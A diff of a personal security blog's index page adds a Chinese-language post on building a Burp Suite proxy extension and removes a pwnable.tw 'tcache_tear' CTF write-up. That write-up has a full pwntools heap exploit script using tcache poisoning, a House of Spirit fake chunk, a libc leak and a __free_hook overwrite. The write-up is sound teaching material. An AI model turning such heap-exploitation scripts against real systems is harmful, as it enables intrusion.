@@ -166,6 +166,112 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/PoRE/d5088fb7cb3c.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ava1.jpg">
+      <meta itemprop="name" content="Cameudis">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cameudis's Homepage">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/Tech/PoRE/d5088fb7cb3c.html" class="post-title-link" itemprop="url">【PoRE#0x03】Burp Extension</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-04-11 21:58:41" itemprop="dateCreated datePublished" datetime="2023-04-11T21:58:41+08:00">2023-04-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-01-11 16:34:30" itemprop="dateModified" datetime="2024-01-11T16:34:30+08:00">2024-01-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tech/PoRE/" itemprop="url" rel="index"><span itemprop="name">PoRE</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/Tech/PoRE/d5088fb7cb3c.html" class="post-meta-item leancloud_visitors" data-flag-title="【PoRE#0x03】Burp Extension" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/Tech/PoRE/d5088fb7cb3c.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/Tech/PoRE/d5088fb7cb3c.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>官方教程：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/extensions/creating">Creating Burp extensions - PortSwigger</a><br>Montoya官方文档：<a target="_blank" rel="noopener" href="https://portswigger.github.io/burp-extensions-montoya-api/javadoc/burp/api/montoya/MontoyaApi.html">MontoyaApi</a><br>Montoya官方示例：<a target="_blank" rel="noopener" href="https://github.com/PortSwigger/burp-extensions-montoya-api-examples">PortSwigger&#x2F;burp-extensions-montoya-api-examples: Examples for using the Montoya API with Burp Suite</a></p>
+<p>Burp Suite过去插件开发使用的是Extender API，不过最近推出了一套新的API（今年1月刚刚发布），叫做Montoya API。新的API增加了Burp Suite插件开发的简便性，但是似乎并不完善，还有一些接口没有实现的样子。</p>
+<p>对于Lab4中的任务，也就是自动处理HTTP包的插件，可以参考这个例子：<a target="_blank" rel="noopener" href="https://github.com/PortSwigger/burp-extensions-montoya-api-examples/tree/main/proxyhandler/src/main/java/example/proxyhandler">burp-extensions-montoya-api-examples&#x2F;proxyhandler&#x2F;src&#x2F;main&#x2F;java&#x2F;example&#x2F;proxyhandler at main · PortSwigger&#x2F;burp-extensions-montoya-api-examples</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ext</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;Lab4_Extension&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Logging</span> <span class="variable">logging</span> <span class="operator">=</span> api.logging();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to our output stream</span></span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Hello output.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        api.proxy().registerRequestHandler(<span class="keyword">new</span> <span class="title class_">RequestHandler</span>(logging));</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Bind RequestHandler&quot;</span>);</span><br><span class="line">        api.proxy().registerResponseHandler(<span class="keyword">new</span> <span class="title class_">RespondHandler</span>(logging));</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Bind RespondHandler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestHandler</span> <span class="keyword">implements</span> <span class="title class_">ProxyRequestHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logging logging;</span><br><span class="line">    RequestHandler(Logging logging) &#123;</span><br><span class="line">        <span class="built_in">this</span>.logging = logging;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyRequestReceivedAction <span class="title function_">handleRequestReceived</span><span class="params">(InterceptedRequest interceptedRequest)</span> &#123;</span><br><span class="line"></span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Request&quot;</span>);</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;url &quot;</span> + interceptedRequest.url());</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;request &quot;</span> + interceptedRequest.bodyToString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// modify the request</span></span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">new_request</span> <span class="operator">=</span> interceptedRequest;</span><br><span class="line">        <span class="keyword">if</span> (interceptedRequest.url().contains(<span class="string">&quot;login&quot;</span>)) &#123;</span><br><span class="line">            logging.logToOutput(<span class="string">&quot;Login detected&quot;</span>);</span><br><span class="line">            new_request = interceptedRequest.withBody(<span class="string">&quot;msg=...&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (interceptedRequest.url().contains(<span class="string">&quot;buy&quot;</span>)) &#123;</span><br><span class="line">            logging.logToOutput(<span class="string">&quot;Buy detected&quot;</span>);</span><br><span class="line">            new_request = interceptedRequest.withBody(<span class="string">&quot;msg=...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ProxyRequestReceivedAction.continueWith(new_request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyRequestToBeSentAction <span class="title function_">handleRequestToBeSent</span><span class="params">(InterceptedRequest interceptedRequest)</span> &#123;</span><br><span class="line">        <span class="comment">//Do nothing with the user modified request, continue as normal.</span></span><br><span class="line">        <span class="keyword">return</span> ProxyRequestToBeSentAction.continueWith(interceptedRequest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RespondHandler</span> <span class="keyword">implements</span> <span class="title class_">ProxyResponseHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logging logging;</span><br><span class="line">    RespondHandler(Logging logging) &#123;</span><br><span class="line">        <span class="built_in">this</span>.logging = logging;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyResponseReceivedAction <span class="title function_">handleResponseReceived</span><span class="params">(InterceptedResponse interceptedResponse)</span> &#123;</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Response&quot;</span>);</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;response &quot;</span> + interceptedResponse.bodyToString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// modify the response</span></span><br><span class="line">        <span class="keyword">if</span> (interceptedResponse.bodyToString().equals(<span class="string">&quot;...&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ProxyResponseReceivedAction.continueWith(interceptedResponse.withBody(<span class="string">&quot;...&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ProxyResponseReceivedAction.continueWith(interceptedResponse);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyResponseToBeSentAction <span class="title function_">handleResponseToBeSent</span><span class="params">(InterceptedResponse interceptedResponse)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ProxyResponseToBeSentAction.continueWith(interceptedResponse);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/141743759f16.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1244,138 +1350,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/7e0b30214381.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/ava1.jpg">
-      <meta itemprop="name" content="Cameudis">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Cameudis's Homepage">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/Tech/Pwn/7e0b30214381.html" class="post-title-link" itemprop="url">【Pwn#0x0A】pwnable.tw tcache_tear writeup</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-02-01 15:16:30" itemprop="dateCreated datePublished" datetime="2023-02-01T15:16:30+08:00">2023-02-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/Tech/Pwn/7e0b30214381.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x0A】pwnable.tw tcache_tear writeup" title="Views">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">Views: </span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine: </span>
-    
-    <a title="valine" href="/Tech/Pwn/7e0b30214381.html#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/7e0b30214381.html" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>完全自己做出来的一个堆题，算是入门堆利用了吧哈哈。</p>
-<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>GLIBC 2.27 64bits，关闭了 PIE。<br>菜单题，提供了 alloc、free、info、exit 四个功能。</p>
-<ol>
-<li>通过 alloc，用户可以自由申请小于 0xff（不含 chunk header）大小的区块并向其中填入 size-0x16 个任意字符（奇怪的限制）。整个程序只有一个放指针的槽位，是一个全局符号，记为gptr。</li>
-<li>通过 free，用户可以释放全局符号 gptr 指向的空间。但程序使用局部变量作了限制，程序最多只能 free 8 次。<strong>漏洞：free 完没有清空指针</strong></li>
-<li>通过 info，用户可以用 write 打印全局符号 name 处的值。这个符号本没有名字，但程序一开始会让我们输入一个 name 存储在这个符号的位置，所以就叫他 name。</li>
-<li>通过 exit，用户可以退出程序。</li>
-</ol>
-<p>程序没有什么自带的后门函数，orw 的三个函数都不齐。</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>结合分析可以看出，必须要泄露 libc 基址才能搞事情。所以需要在 2.27 的版本下，想办法绕过 tcache 让 chunk 进入 unsorted bin 来获取 libc 地址。<br>程序的唯一打印功能是打印固定地址处的内容，所以还需要用 house of spirit 的思想在 name 处构造假区块。</p>
-<p>综上，攻击步骤有如下几步：</p>
-<ol>
-<li>构造 fake chunk 头部</li>
-<li>构造 fake chunk 尾部，保证通过 free 的检查</li>
-<li>释放 fake chunk 进入 unsorted bin</li>
-<li>使用 info 功能泄露 libc 基址</li>
-<li>覆写 <code>__free_hook</code> 为 one_gadget</li>
-</ol>
-<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="构造-fake-chunk"><a href="#构造-fake-chunk" class="headerlink" title="构造 fake chunk"></a>构造 fake chunk</h3><p>为了完成 House of Spirit 攻击，我们需要精心构造 fake chunk。<br>首先，为了不被分进 fastbins，chunksize 需要&gt;&#x3D;0x90，这里就使用 0x90。<br>其次，为了不与别的 chunk 合并，首先低位的 chunk 通过 0x91 的 1 来解决；高位的 chunk 就需要再构造两个 fake chunk，如下图所示：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">├──────┬──────┤  │</span><br><span class="line">│      │0x21  │  │</span><br><span class="line">├──────┴──────┤ ─┼─ Name+0xb0</span><br><span class="line">│             │  │</span><br><span class="line">├──────┬──────┤  │</span><br><span class="line">│      │0x21  │  │</span><br><span class="line">├──────┴──────┤ ─┼─ Name+0x90</span><br><span class="line">│             │  │</span><br><span class="line">│             │  │ Fake Chunk</span><br><span class="line">│             │  │</span><br><span class="line">│             │  │ beyond fastbin</span><br><span class="line">│             │  │</span><br><span class="line">│             │  │</span><br><span class="line">│             │  │</span><br><span class="line">│             │  │</span><br><span class="line">│             │  │</span><br><span class="line">├──────┬──────┤  │</span><br><span class="line">│      │0x91  │  │</span><br><span class="line">├──────┴──────┤ ─┼─ Name</span><br></pre></td></tr></table></figure>
-
-<p>fake chunk 的头部可以程序开始的时候输入 Name 0x91 来完成。高位的两个 fake chunk 就需要使用 tcache dub 然后 poisoning 来完成了，代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fake chunk header</span></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + pack(<span class="number">0x91</span>)</span><br><span class="line">io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake chunk tail</span></span><br><span class="line">alloc(<span class="number">0x40</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">alloc(<span class="number">0x40</span>, pack(<span class="number">0x6020f0</span>))     <span class="comment"># 0x602060 + 0x90</span></span><br><span class="line">alloc(<span class="number">0x40</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">alloc(<span class="number">0x40</span>, pack(<span class="number">0</span>) + pack(<span class="number">0x21</span>) + pack(<span class="number">0</span>)*<span class="number">3</span> + pack(<span class="number">0x21</span>))</span><br></pre></td></tr></table></figure>
-
-<h3 id="泄露-libc"><a href="#泄露-libc" class="headerlink" title="泄露 libc"></a>泄露 libc</h3><p>构造完了 fake chunk，我们需要通过释放它来达到目的。为此我们有两种方法：一种是覆写全局 gp 为 fake chunk 地址；另一种是 poisoning tcache 把 fake chunk 取出，这里我们随便地采用后者。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># alloc fake chunk</span></span><br><span class="line">alloc(<span class="number">0x80</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">alloc(<span class="number">0x80</span>, pack(<span class="number">0x602070</span>))     <span class="comment"># 0x602060 + 0x10</span></span><br><span class="line">alloc(<span class="number">0x80</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>, <span class="string">b&quot;I&#x27;m a fake chunk&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>然后就可以释放并泄露 libc 基址了：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># free fake chunk into unsorted bin</span></span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc&#x27;s base address</span></span><br><span class="line">info()</span><br><span class="line">libc_addr = unpack(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;libc :&quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure>
-
-<h3 id="覆写-hook"><a href="#覆写-hook" class="headerlink" title="覆写 hook"></a>覆写 hook</h3><p>有了 libc 基址，再加上 tcache 的任意写能力，就可以把 hook 覆写为 one_gadget 来完成攻击。脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free_hook = libc_addr + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">one_gadget = libc_addr + <span class="number">0x4f322</span> <span class="comment"># 0x10a38c</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">alloc(<span class="number">0x60</span>, pack(free_hook))</span><br><span class="line">alloc(<span class="number">0x60</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>, pack(one_gadget))</span><br><span class="line"></span><br><span class="line">free()</span><br></pre></td></tr></table></figure>
-
-<h2 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">io = process([filename])</span><br><span class="line"><span class="comment"># io = remote(&quot;chall.pwnable.tw&quot;, 10207)</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">libc_name = <span class="string">&quot;./libc.so&quot;</span></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Data:&quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- stage 1 : leak libc_addr ---</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake chunk header</span></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + pack(<span class="number">0x91</span>)</span><br><span class="line">io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake chunk tail</span></span><br><span class="line">alloc(<span class="number">0x40</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">alloc(<span class="number">0x40</span>, pack(<span class="number">0x6020f0</span>))     <span class="comment"># 0x602060 + 0x90</span></span><br><span class="line">alloc(<span class="number">0x40</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">alloc(<span class="number">0x40</span>, pack(<span class="number">0</span>) + pack(<span class="number">0x21</span>) + pack(<span class="number">0</span>)*<span class="number">3</span> + pack(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc fake chunk</span></span><br><span class="line">alloc(<span class="number">0x80</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">alloc(<span class="number">0x80</span>, pack(<span class="number">0x602070</span>))     <span class="comment"># 0x602060 + 0x10</span></span><br><span class="line">alloc(<span class="number">0x80</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>, <span class="string">b&#x27;haha&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free fake chunk into unsorted bin</span></span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc&#x27;s base address</span></span><br><span class="line">info()</span><br><span class="line">libc_addr = unpack(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;libc :&quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- stage 2 : overwrite hook ---</span></span><br><span class="line"></span><br><span class="line">free_hook = libc_addr + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">one_gadget = libc_addr + <span class="number">0x4f322</span> <span class="comment"># 0x10a38c</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">alloc(<span class="number">0x60</span>, pack(free_hook))</span><br><span class="line">alloc(<span class="number">0x60</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>, pack(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- stage 3 : pwn ---</span></span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
